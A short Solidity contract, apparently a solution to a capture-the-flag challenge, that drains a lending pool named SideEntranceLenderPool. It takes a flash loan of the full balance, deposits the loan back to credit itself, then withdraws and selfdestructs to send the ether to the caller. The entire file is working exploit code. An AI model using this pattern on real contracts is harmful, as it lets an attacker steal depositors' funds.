pragma solidity ^0.6.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceHacker {
    SideEntranceLenderPool selp;
    address payable owner;

    constructor(SideEntranceLenderPool _selp) public {
        selp = _selp;
        owner = msg.sender;
    }

    function start() public {
        selp.flashLoan(address(selp).balance);
        selp.withdraw();
        selfdestruct(msg.sender);
    }

    function execute() public payable {
        selp.deposit{value: msg.value}();
    }

    receive() external payable {}
}